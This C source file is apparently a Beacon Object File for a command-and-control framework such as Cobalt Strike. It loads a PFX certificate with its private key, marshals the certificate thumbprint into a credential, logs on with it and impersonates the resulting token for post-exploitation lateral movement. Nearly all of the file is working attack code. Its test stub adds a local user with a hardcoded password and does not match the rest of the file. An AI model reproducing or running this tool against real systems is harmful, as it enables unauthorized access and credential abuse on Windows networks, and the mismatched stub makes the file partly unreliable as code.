#include <windows.h>
#include <stdio.h>
#include <lmaccess.h>
#include "beacon.h"
#include "bofdefs.h"
#include <wincred.h>
#include "base.c"


// void hex_to_bytes(const char *hex_str, unsigned char *byte_array, size_t *len) {
//     size_t hex_len = MSVCRT$strlen(hex_str);
//     if (hex_len % 2 != 0) {
//         // Hex string length must be even
//         *len = 0;
//         return;
//     }

//     *len = hex_len / 2;

//     for (size_t i = 0; i < *len; i++) {
//         MSVCRT$sscanf(hex_str + 2 * i, "%2x", &(byte_array[i]));
//     }
// }
//thumbprint is assumed to have at least 20 bytes of space
HCERTSTORE LoadCert(unsigned char * cert, const wchar_t * password, DWORD certlen, DWORD passlen, PCCERT_CONTEXT * pcert)
{
	CRYPT_DATA_BLOB pfxData;
	pfxData.cbData = certlen;
	pfxData.pbData = cert;
	*pcert = NULL;
	PCCERT_CONTEXT pnewcert;
	HCERTSTORE hCertStore = CRYPT32$CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_CURRENT_USER, L"MY");
    if (!hCertStore) {
        internal_printf("Failed to open the certificate store. Error: %lu\n", KERNEL32$GetLastError());
        return NULL;
    }
	// Handle empty password which is represented as two null bytes in wchar_t.
	if (passlen == 2) {
		password = NULL;
	}
	HCERTSTORE store = CRYPT32$PFXImportCertStore(&pfxData, password, PKCS12_ALLOW_OVERWRITE_KEY | PKCS12_ALWAYS_CNG_KSP);
	if(store == NULL)
	{
		internal_printf("Failed to import cert, make sure its in the right format: %x\n", KERNEL32$GetLastError());
		return NULL;
	}
	// Iterate through certs in the PFX to find the one with a private key (skip CA certs)
	PCCERT_CONTEXT pEnumCert = NULL;
	while ((pEnumCert = CRYPT32$CertEnumCertificatesInStore(store, pEnumCert)) != NULL)
	{
		DWORD keySpec = 0;
		DWORD keySpecSize = sizeof(keySpec);
		if (CRYPT32$CertGetCertificateContextProperty(pEnumCert, CERT_KEY_SPEC_PROP_ID, &keySpec, &keySpecSize))
		{
			*pcert = pEnumCert;
			break;
		}
	}
	if (*pcert == NULL)
	{
		internal_printf("No certificate with a private key found in PFX\n");
		CRYPT32$CertCloseStore(store, 0);
		CRYPT32$CertCloseStore(hCertStore, 0);
		return NULL;
	}
	CRYPT32$CertAddCertificateContextToStore(hCertStore, *pcert, CERT_STORE_ADD_ALWAYS, &pnewcert);
	CRYPT32$CertDeleteCertificateFromStore(*pcert);
	CRYPT32$CertCloseStore(store, 0);
	*pcert = pnewcert;
	return hCertStore;
}

//thumbprint is assumed to be >= 20 bytes
void ImpersonateUser(PCCERT_CONTEXT pCertContext)
{
	DWORD hashSize = 20;
	CERT_CREDENTIAL_INFO ci;
	ci.cbSize = sizeof(CERT_CREDENTIAL_INFO);
	LPWSTR creds;
	if(!CRYPT32$CertGetCertificateContextProperty(pCertContext, CERT_HASH_PROP_ID, ci.rgbHashOfCert, &hashSize))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to get Thumbprint: %d", KERNEL32$GetLastError());
		return;
	}
	internal_printf("Cert Thumbprint: ");
	for (DWORD i = 0; i < hashSize; i++) {
            internal_printf("%02X", ci.rgbHashOfCert[i]);
	}
	internal_printf("\n");
	if(!ADVAPI32$CredMarshalCredentialW(1, &ci, &creds))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to marshal creds: %d", KERNEL32$GetLastError());
		return;
	}
	HANDLE hToken = NULL;
	if(!ADVAPI32$LogonUserW(creds, NULL, NULL, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to Logon: %d", KERNEL32$GetLastError());
		return;
	}
	#ifdef COBALTSTRIKE
	BeaconUseToken(hToken); //This does not appear to properly show the correct user currently, but leaving it for when CS fixes it.
	#else
	if(!ADVAPI32$ImpersonateLoggedOnUser(hToken))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate: %d", KERNEL32$GetLastError());
		return;
	}
	#endif
	BeaconPrintf(CALLBACK_OUTPUT, "success");

end:
	if(hToken)
	{
		KERNEL32$CloseHandle(hToken);
	}
}

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	datap parser;
	DWORD len, passlen;
	BeaconDataParse(&parser, Buffer, Length);
	unsigned char * cert = (unsigned char *)BeaconDataExtract(&parser, (int *)&len); // $2
	LPWSTR password = (LPWSTR)BeaconDataExtract(&parser, (int *)&passlen);
	if(!bofstart())
	{
		return;
	}

	if(!cert || len == 0)
	{
		internal_printf("Cert data is empty\n");
		goto go_end;
	}

	internal_printf("Loading Cert into temp store\n");
	PCCERT_CONTEXT pcert = NULL;
	HCERTSTORE store = LoadCert(cert, password, len, passlen, &pcert);
	if(pcert != NULL)
	{
		ImpersonateUser(pcert);
		internal_printf("success\n");
		CRYPT32$CertDeleteCertificateFromStore(pcert);
		CRYPT32$CertCloseStore(store, 0);
	}
	else
	{
		internal_printf("failed\n");
	}


go_end:
	printoutput(TRUE);
	
	bofstop();
};

// VOID go( 
// 	IN PCHAR Buffer, 
// 	IN ULONG Length 
// ) 
// {
// 	DWORD dwErrorCode = ERROR_SUCCESS;
// 	datap parser;
// 	size_t len;
// 	BeaconDataParse(&parser, Buffer, Length);
// 	LPSTR certHash = BeaconDataExtract(&parser, (int *)&len); // $2
// 	CERT_CREDENTIAL_INFO ci;
// 	ci.cbSize = sizeof(CERT_CREDENTIAL_INFO);
// 	len--; //delete null
// 	BeaconPrintf(CALLBACK_OUTPUT, "Converting %s : %d to bytes\n", certHash,len);

// 	if(len > 40)
// 	{
// 		BeaconPrintf(CALLBACK_ERROR, "Hash isn't the right length\n");
// 		return;
// 	}
// 	hex_to_bytes(certHash, ci.rgbHashOfCert, &len); //Could blow up if a string isn't right, just for testing here
// 	// for(int i = 0; i < len; i++)
// 	// {
// 	// 	BeaconPrintf(CALLBACK_OUTPUT, "%2X", ci.rgbHashOfCert[i]);
// 	// }
// 	BeaconPrintf(CALLBACK_OUTPUT, "converted %x : %d", ci.rgbHashOfCert, len);
// 	LPWSTR creds = NULL;
// 	if(!ADVAPI32$CredMarshalCredentialW(1, &ci, &creds))
// 	{
// 		BeaconPrintf(CALLBACK_ERROR, "Failed to marshal creds: %d", KERNEL32$GetLastError());
// 		return;
// 	}
// 	BeaconPrintf(CALLBACK_OUTPUT, "success");
// 	HANDLE hToken = NULL;
// 	if(!ADVAPI32$LogonUserW(creds, NULL, NULL, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken))
// 	{
// 		BeaconPrintf(CALLBACK_ERROR, "Failed to Logon: %d", KERNEL32$GetLastError());
// 		return;
// 	}
// 	if(!ADVAPI32$ImpersonateLoggedOnUser(hToken))
// 	{
// 		BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate: %d", KERNEL32$GetLastError());
// 		return;
// 	}
// 	// if(!bofstart())
// 	// {
// 	// 	return;
// 	// }

// go_end:
// 	// printoutput(TRUE);
	
// 	// bofstop();
// };
#else
#define TEST_USERNAME L"Guest"
#define TEST_HOSTNAME NULL
#define TEST_PASSWORD L"Password123!"

int main(int argc, char ** argv)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	LPWSTR lpswzUserName = TEST_USERNAME;
	LPWSTR lpswzPassword = TEST_PASSWORD;
	LPWSTR lpswzServerName = TEST_HOSTNAME;

	internal_printf("Adding %S to %S\n", lpswzUserName, lpswzServerName ? lpswzServerName : L"the local machine" );

	dwErrorCode = AddUser(lpswzUserName, lpswzPassword, lpswzServerName);
	if ( ERROR_SUCCESS != dwErrorCode )
	{
		BeaconPrintf(CALLBACK_ERROR, "Adding user failed: %lX\n", dwErrorCode);
		goto main_end;
	}

	internal_printf("SUCCESS.\n");

main_end:
	return dwErrorCode;
}
#endif